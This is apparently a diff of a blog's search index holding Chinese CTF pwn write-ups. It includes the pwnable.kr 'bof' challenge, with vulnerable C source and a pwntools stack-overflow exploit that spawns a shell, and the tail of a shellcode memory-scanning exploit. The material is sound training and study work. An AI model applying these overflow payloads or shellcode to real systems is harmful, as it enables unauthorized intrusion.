r12,0xfffff0000000</span></span><br><span class="line"><span class="string">    mov r15,0x1000#r15储存偏移</span></span><br><span class="line"><span class="string">    mov rdx,0x1000#打印长度设置为0x1000</span></span><br><span class="line"><span class="string">    mov rax,1</span></span><br><span class="line"><span class="string">    syscall#write(rdi,rsi,rdx)</span></span><br><span class="line"><span class="string">    mov rsi,rcx#write执行后rcx 储存着shllcode的相关地址</span></span><br><span class="line"><span class="string">    and rsi,r12#丢弃后28位</span></span><br><span class="line"><span class="string">    add rsi,r15#rsi=rsi+偏移地址</span></span><br><span class="line"><span class="string">    add r15,0x1000#偏移递增0x1000</span></span><br><span class="line"><span class="string">    jmp $-0x19#循环 跳转到mov rax，1 </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(start)</span><br><span class="line">payload=asm(code)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;flag&#123;&quot;</span>)</span><br><span class="line">flag=<span class="string">b&#x27;flag&#123;&#x27;</span>+sh.recvuntil(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>其实这题不难，比赛过程中被自己误导后就放弃了，也个自己涨了教训，当遇到“绝境“的时候不妨静下心仔细调试一下。</p>
-]]></content>
-      <categories>
-        <category>比赛</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
@@ -840,6 +970,28 @@
       </tags>
   </entry>
   <entry>
+    <title>bof</title>
+    <url>/2022/07/12/bof(wp)/</url>
+    <content><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>一道简单的溢出题目</p>
+<h1 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h1><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> key)</span>&#123;</span><br><span class="line">	<span class="type">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;overflow me : &quot;</span>);</span><br><span class="line">	gets(overflowme);	<span class="comment">// smash me!</span></span><br><span class="line">	<span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">		system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Nah..\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">	func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出gets函数存在栈溢出漏洞，明显需要溢出覆盖<code>key</code>为<code>0xcafebabe</code>然后获得flag。</p>
+<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>拖到32位ida，进入func函数，查看栈结构</p>
+<img src="/2022/07/12/bof(wp)/image-20220712190744409.png" class="" title="image-20220712190744409">
+
+<p>上图<code>arg_0</code>就是函数传进来的参数也就是<code>key</code>的位置，这样就可以计算<code>s</code>和<code>key</code>相差0x34个字节，再向后将<code>key</code>的位置覆盖为<code>0xcafebabe</code>就可以获得flag。</p>
+<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>, <span class="number">9000</span>)</span><br><span class="line">value = <span class="number">0xCAFeBABe</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">52</span> + p32(value)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>刷题</category>
+        <category>pwnable刷题</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>bugku 秋名山车神</title>
     <url>/2022/08/06/bugku_%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%BD%A6%E7%A5%9E/</url>
     <content><![CDATA[<h1 id="bugku-秋名山车神"><a href="#bugku-秋名山车神" class="headerlink" title="bugku 秋名山车神"></a>bugku 秋名山车神</h1><p><em><strong>get新知识：一些有关python爬虫的基本知识</strong></em></p>
@@ -882,28 +1034,6 @@
       </categories>
       <tags>
         <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>bof</title>
-    <url>/2022/07/12/bof(wp)/</url>
-    <content><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>一道简单的溢出题目</p>
-<h1 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h1><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> key)</span>&#123;</span><br><span class="line">	<span class="type">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;overflow me : &quot;</span>);</span><br><span class="line">	gets(overflowme);	<span class="comment">// smash me!</span></span><br><span class="line">	<span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">		system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Nah..\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">	func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>可以看出gets函数存在栈溢出漏洞，明显需要溢出覆盖<code>key</code>为<code>0xcafebabe</code>然后获得flag。</p>
-<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>拖到32位ida，进入func函数，查看栈结构</p>
-<img src="/2022/07/12/bof(wp)/image-20220712190744409.png" class="" title="image-20220712190744409">
-
-<p>上图<code>arg_0</code>就是函数传进来的参数也就是<code>key</code>的位置，这样就可以计算<code>s</code>和<code>key</code>相差0x34个字节，再向后将<code>key</code>的位置覆盖为<code>0xcafebabe</code>就可以获得flag。</p>
-<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>, <span class="number">9000</span>)</span><br><span class="line">value = <span class="number">0xCAFeBABe</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">52</span> + p32(value)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>刷题</category>
-        <category>pwnable刷题</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
@@ -1331,12 +1461,11 @@
       </tags>
   </entry>
   <entry>
-    <title>embryoio level2</title>
-    <url>/2022/06/08/embryoio-level2/</url>
+    <title>embryoio level1</title>
+    <url>/2022/06/08/embryoio-level1/</url>
     <content><![CDATA[<h2 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h2><p>会用基本的Linux指令</p>
-<h2 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h2><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><p><img src="/2022/06/08/embryoio-level2/level2-1.png" alt="屏幕截图 2022-06-07 120319"></p>
-<p>可以看到程序让我们输入一个简单的密码，我们先随便输入个数据，然后看到程序说我们的密码是错的，正确的密码就在括号里。所以我们再次运行程序，输入正确的密码，就得到了flag，具体操作如下图所示。</p>
-<p><img src="/2022/06/08/embryoio-level2/level2-2.png" alt="屏幕截图 2022-06-07 121423"></p>
+<h2 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h2><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><p><img src="/2022/06/08/embryoio-level1/level1.png" alt="level1"></p>
+<p>可以看到进入challenge目录后运行题目程序就得到了一个flag</p>
 ]]></content>
       <categories>
         <category>刷题</category>
@@ -1347,11 +1476,12 @@
       </tags>
   </entry>
   <entry>
-    <title>embryoio level1</title>
-    <url>/2022/06/08/embryoio-level1/</url>
+    <title>embryoio level2</title>
+    <url>/2022/06/08/embryoio-level2/</url>
     <content><![CDATA[<h2 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h2><p>会用基本的Linux指令</p>
-<h2 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h2><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><p><img src="/2022/06/08/embryoio-level1/level1.png" alt="level1"></p>
-<p>可以看到进入challenge目录后运行题目程序就得到了一个flag</p>
+<h2 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h2><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><p><img src="/2022/06/08/embryoio-level2/level2-1.png" alt="屏幕截图 2022-06-07 120319"></p>
+<p>可以看到程序让我们输入一个简单的密码，我们先随便输入个数据，然后看到程序说我们的密码是错的，正确的密码就在括号里。所以我们再次运行程序，输入正确的密码，就得到了flag，具体操作如下图所示。</p>
+<p><img src="/2022/06/08/embryoio-level2/level2-2.png" alt="屏幕截图 2022-06-07 121423"></p>
 ]]></content>
       <categories>
         <category>刷题</category>
@@ -1689,7 +1819,7 @@
 <p>​    print(“     To use this python script , you must install the tshark first.”)</p>
 <p>​    print(“     You can use <code>sudo apt-get install tshark</code> to install it”)</p>
 <p>​    print(“Author : “)</p>
-<p>​    print(“     WangYihang <a href="mailto:&#119;&#97;&#110;&#103;&#x79;&#x69;&#104;&#97;&#110;&#103;&#x65;&#x72;&#64;&#x67;&#x6d;&#97;&#x69;&#x6c;&#x2e;&#x63;&#x6f;&#109;">&#119;&#97;&#110;&#103;&#x79;&#x69;&#104;&#97;&#110;&#103;&#x65;&#x72;&#64;&#x67;&#x6d;&#97;&#x69;&#x6c;&#x2e;&#x63;&#x6f;&#109;</a>“)</p>
+<p>​    print(“     WangYihang <a href="mailto:&#x77;&#97;&#110;&#x67;&#121;&#x69;&#x68;&#x61;&#110;&#103;&#101;&#x72;&#64;&#103;&#109;&#x61;&#105;&#x6c;&#46;&#99;&#111;&#109;">&#x77;&#97;&#110;&#x67;&#121;&#x69;&#x68;&#x61;&#110;&#103;&#101;&#x72;&#64;&#103;&#109;&#x61;&#105;&#x6c;&#46;&#99;&#111;&#109;</a>“)</p>
 <p>​    print(“     If you have any questions , please contact me by email.”)</p>
 <p>​    print(“     Thank you for using.”)</p>
 <p>​    exit(1)</p>
